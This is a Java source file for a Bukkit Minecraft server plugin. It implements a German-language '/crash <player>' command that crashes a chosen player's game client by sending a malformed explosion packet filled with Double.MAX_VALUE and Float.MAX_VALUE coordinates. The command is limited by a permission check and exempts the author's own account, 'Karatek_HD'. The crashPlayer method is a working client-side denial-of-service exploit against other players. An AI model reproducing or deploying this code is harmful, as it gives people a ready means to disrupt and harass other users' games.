package com.karatek.core.commands;



import java.util.Collections;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;

import com.karatek.core.main.Main;

import net.minecraft.server.v1_8_R1.EntityPlayer;
import net.minecraft.server.v1_8_R1.Packet;
import net.minecraft.server.v1_8_R1.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R1.PacketPlayOutSpawnEntityLiving;
import net.minecraft.server.v1_8_R1.Vec3D;

public class Command_Crash implements CommandExecutor {
	
	

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		
		Player p =(Player) sender;
		
		if(!p.hasPermission("karatek.crash")){
			p.sendMessage(Main.pre + " Dir fehlt die Berrechtigung §akaratek.crash§r.");
		} else {
			if(args.length == 0) {
				p.sendMessage("§cVerwendung: /crash <Spieler>");
			} else if(args.length == 1) {
				Player target = Bukkit.getServer().getPlayer(args[0]);
				if(target == null){
					p.sendMessage("Der Spieler" + args[0] + " ist nicht online!");
					
				} else if(target.getName().equalsIgnoreCase(p.getName())){
					p.sendMessage("§CDu willst dich doch nicht selber crashen oder?");
				} else if(target.getName().equalsIgnoreCase("Karatek_HD")){
					p.sendMessage("§CDu darfst diesen Spieler nicht crashen!");
				}
			else {
					crashPlayer(p, target);
				}
			} else {
				p.sendMessage("§CVerwendung: /crash <Spieler>");
			}
		}
		return false;
	}
	
	public void crashPlayer(Player sender, Player target) {
		final String name = target.getName();
		final String dpn = target.getDisplayName();
		EntityPlayer nmsPlayer = ((CraftPlayer) target).getHandle();
		PacketPlayOutSpawnEntityLiving packet = new PacketPlayOutSpawnEntityLiving(nmsPlayer);
		nmsPlayer.playerConnection.sendPacket(packet);
		((CraftPlayer) target).getHandle().playerConnection.sendPacket((Packet) new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
		sender.sendMessage("§rDu hast den Spieler §e" + dpn + " §rgecrashed.");
		System.out.println("Der Spieler " + sender.getName() + "hat den Spieler " + name + "gecrasht.");
	}
	
	

}